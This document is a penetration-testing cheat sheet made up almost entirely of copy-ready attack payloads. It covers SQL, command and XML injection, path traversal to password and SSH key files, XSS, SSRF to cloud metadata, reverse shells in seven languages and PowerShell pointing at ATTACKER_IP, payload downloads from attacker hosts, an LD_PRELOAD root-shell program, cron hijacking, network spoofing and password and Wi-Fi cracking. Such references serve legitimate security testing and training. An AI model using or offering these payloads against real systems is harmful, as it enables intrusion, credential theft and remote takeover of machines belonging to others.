# Attack Patterns Reference

This reference document contains common attack patterns, payloads, and exploitation techniques for penetration testing.

## Web Application Attacks

### SQL Injection Payloads

**Basic Detection**:
```sql
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
' OR '1'='1'/*
admin' --
admin' #
```

**Union-Based**:
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password FROM users--
```

**Time-Based Blind**:
```sql
'; WAITFOR DELAY '00:00:05'--
' OR SLEEP(5)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

**Boolean-Based Blind**:
```sql
' AND 1=1--
' AND 1=2--
' AND LENGTH(database())>5--
```

### Command Injection

**Detection Payloads**:
```bash
; id
| id
|| id
& id
&& id
`id`
$(id)
;whoami
|whoami
```

**Common Injection Points**:
- URL parameters: `?cmd=ls;id`
- POST data: `command=ls;whoami`
- File uploads: `filename.jpg;wget http://attacker/shell.sh`
- User-Agent headers
- Referrer headers

**Bypass Techniques**:
```bash
# Space bypass
{ls,-la}
$IFS
${IFS}
%20

# Keyword bypass
cat /etc/pass'w'd
cat /etc/pass$()wd
cat /etc/pass``wd
c'a't /etc/passwd

# Encoding
%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64 (URL encoded)
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash (base64)
```

### Path Traversal / LFI

**Basic Payloads**:
```
../
../../
../../../
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd
..%252f..%252f..%252fetc%252fpasswd (double encoding)
```

**Null Byte Injection** (PHP < 5.3.4):
```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
```

**PHP Wrappers**:
```
php://filter/convert.base64-encode/resource=index.php
php://input (POST data execution)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

**Common Sensitive Files**:
```
/etc/passwd
/etc/shadow
/root/.ssh/id_rsa
/home/user/.ssh/id_rsa
/var/www/html/config.php
/etc/apache2/apache2.conf
/var/log/apache2/access.log
C:\Windows\System32\config\SAM
C:\Windows\win.ini
```

### Cross-Site Scripting (XSS)

**Basic Payloads**:
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
<body onload=alert(1)>
```

**Filter Bypass**:
```html
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<svg/onload=alert(1)>
<ScRiPt>alert(1)</sCrIpT>
```

### XML External Entity (XXE)

**Basic XXE**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**Blind XXE (Out-of-Band)**:
```xml
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
```

### Server-Side Request Forgery (SSRF)

**Detection**:
```
http://localhost
http://127.0.0.1
http://169.254.169.254/latest/meta-data/ (AWS metadata)
http://metadata.google.internal/ (GCP)
```

**Bypass Filters**:
```
http://127.1
http://0.0.0.0
http://[::1]
http://2130706433 (decimal IP)
http://0x7f000001 (hex IP)
```

## Reverse Shells

### Bash
```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done
```

### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### PHP
```php
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'");?>
```

### Netcat
```bash
nc -e /bin/sh ATTACKER_IP PORT
nc -c /bin/sh ATTACKER_IP PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
```

### Perl
```perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby
```ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Privilege Escalation

### Linux SUID Binary Exploitation

**Finding SUID Binaries**:
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

**Common Exploitable SUID Binaries** (GTFOBins):

**find**:
```bash
find . -exec /bin/sh -p \; -quit
```

**nmap** (older versions):
```bash
nmap --interactive
!sh
```

**vim**:
```bash
vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

**awk**:
```bash
awk 'BEGIN {system("/bin/sh -p")}'
```

**wget**:
```bash
# Overwrite /etc/passwd
wget http://attacker.com/passwd -O /etc/passwd
```

### Linux Capabilities Exploitation

**Finding Capabilities**:
```bash
getcap -r / 2>/dev/null
```

**CAP_SETUID**:
```bash
# If python has cap_setuid
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**CAP_DAC_READ_SEARCH**:
```bash
# Read any file
tar -czf /tmp/shadow.tar.gz /etc/shadow
```

### Sudo Exploitation

**Checking Sudo Privileges**:
```bash
sudo -l
```

**LD_PRELOAD Exploit**:
```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so [ALLOWED_COMMAND]
```

**Sudo Version Exploits**:
- CVE-2021-3156 (Heap-Based Buffer Overflow) - sudo < 1.9.5p2
- CVE-2019-14287 (Bypass via User ID) - sudo < 1.8.28

### Cron Job Exploitation

**Finding Cron Jobs**:
```bash
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/*
```

**PATH Hijacking**:
```bash
# If cron runs: /usr/local/bin/backup.sh
# And PATH includes /tmp first
echo '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' > /tmp/backup.sh
chmod +x /tmp/backup.sh
```

### Kernel Exploits

**Common Linux Kernel Exploits**:
- DirtyCow (CVE-2016-5195) - Linux Kernel 2.6.22 < 3.9
- DirtyCOW2 (CVE-2017-1000367) - Linux Kernel < 4.10.15
- Dirty Pipe (CVE-2022-0847) - Linux Kernel 5.8+

**Checking Kernel Version**:
```bash
uname -a
cat /proc/version
searchsploit linux kernel [VERSION]
```

### Password Cracking

**Shadow File Extraction**:
```bash
unshadow /etc/passwd /etc/shadow > hashes.txt
```

**John the Ripper**:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

**Hashcat**:
```bash
hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

## Windows Exploitation

### Windows Reverse Shells

**PowerShell**:
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Certutil Download**:
```cmd
certutil -urlcache -f http://ATTACKER_IP/shell.exe C:\Windows\Temp\shell.exe
```

### Windows Privilege Escalation

**Enumeration**:
```cmd
whoami /priv
whoami /groups
net user
net localgroup administrators
systeminfo
```

**AlwaysInstallElevated**:
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Unquoted Service Paths**:
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

## Network Attacks

### ARP Spoofing
```bash
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP
```

### DNS Spoofing
```bash
dnsspoof -i eth0 -f hosts.txt
```

### Man-in-the-Middle (MitM)
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoofing + SSL stripping
ettercap -T -q -i eth0 -M arp:remote /GATEWAY_IP// /VICTIM_IP//
```

## Database Attacks

### MySQL
```sql
-- Default credentials
mysql -u root -p
(blank password)

-- Command execution
SELECT sys_exec('whoami');
SELECT INTO OUTFILE '/var/www/html/shell.php' FROM...
```

### PostgreSQL
```sql
-- Default credentials
psql -U postgres
(blank password)

-- Command execution
COPY (SELECT '') TO PROGRAM 'whoami';
```

### MongoDB
```javascript
// No authentication by default
mongo --host TARGET_IP

// List databases
show dbs

// Dump collection
db.users.find()
```

## Wireless Attacks

### WPA/WPA2 Cracking
```bash
# Monitor mode
airmon-ng start wlan0

# Capture handshake
airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon

# Deauth clients to capture handshake
aireplay-ng --deauth 10 -a BSSID wlan0mon

# Crack with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap
```

### WPS PIN Attack
```bash
reaver -i wlan0mon -b BSSID -vv
```

## References

- **GTFOBins**: https://gtfobins.github.io/
- **LOLBAS** (Windows): https://lolbas-project.github.io/
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **HackTricks**: https://book.hacktricks.xyz/
- **Exploit Database**: https://www.exploit-db.com/
- **RevShells**: https://www.revshells.com/
